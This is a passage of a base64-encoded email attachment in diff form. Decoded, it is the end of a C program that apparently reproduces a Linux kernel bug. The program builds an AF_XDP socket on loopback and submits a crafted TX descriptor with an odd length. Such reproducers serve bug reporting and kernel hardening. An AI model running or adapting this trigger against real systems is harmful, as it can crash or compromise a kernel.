+KHU2NCksDQoJCQkJCVBST1RfUkVBRCB8IFBST1RfV1JJVEUsIE1BUF9TSEFSRUQgfCBNQVBfUE9Q
+VUxBVEUsDQoJCQkJCWZkLCBYRFBfVU1FTV9QR09GRl9DT01QTEVUSU9OX1JJTkcpOw0KCWlmIChj
+ciA8IDApDQoJCWVycl9leGl0KCJtbWFwLWNvbXBsZXRpb24tcmluZyIpOw0KDQoJc3RydWN0IHNv
+Y2thZGRyX3hkcCBhZGRyOw0KCW1lbXNldCgmYWRkciwgMCwgc2l6ZW9mIGFkZHIpOw0KCWFkZHIu
+c3hkcF9mYW1pbHkgPSBQRl9YRFA7DQoJYWRkci5zeGRwX2lmaW5kZXggPSBpZl9uYW1ldG9pbmRl
+eCgibG8iKTsNCglhZGRyLnN4ZHBfcXVldWVfaWQgPSAwOw0KCWFkZHIuc3hkcF9mbGFncyA9IFhE
+UF9VU0VfTkVFRF9XQUtFVVA7DQoJcmVzdWx0ID0gYmluZChmZCwgKHN0cnVjdCBzb2NrYWRkciAq
+KSAmYWRkciwgc2l6ZW9mIGFkZHIpOw0KCWlmIChyZXN1bHQgPCAwKQ0KCQllcnJfZXhpdCgiYmlu
+ZCIpOw0KDQoJc3RydWN0IHhkcF9kZXNjKiB0eF9kZXNjID0gKHN0cnVjdCB4ZHBfZGVzYyopICh0
+eCArIG9mZi50eC5kZXNjKTsNCgl0eF9kZXNjLT5hZGRyID0gMHg5MDAwOw0KCXR4X2Rlc2MtPmxl
+biA9IDB4MTAwMCAtIDE7DQoJdHhfZGVzYy0+b3B0aW9ucyA9IDA7DQoNCgl1MzIqIHR4X3Byb2R1
+Y2VyID0gdHggKyBvZmYudHgucHJvZHVjZXI7DQoJdHhfcHJvZHVjZXJbMF0gPSAxOw0KDQoJaW50
+IHJldCA9IHNlbmR0byhmZCwgTlVMTCwgMCwgTVNHX0RPTlRXQUlULCBOVUxMLCAwKTsNCglpZiAo
+cmV0IDwgMCkNCgkJZXJyX2V4aXQoInNlbmR0byIpOw0KCXJldHVybiBmZDsNCn0NCg0KaW50IG1h
+aW4oKQ0Kew0KCXNldHVwX3NhbmRib3goKTsNCglwdXRzKCJTZXR0aW5nIHVwIHNvY2tldCIpOw0K
+CWludCBmZCA9IHNldHVwX3NvY2tldCgpOw0KCXBhY2tldF9yZWN2KCk7DQoJcmV0dXJuIDA7DQp9
+--000000000000da8b8605a615e1e6--
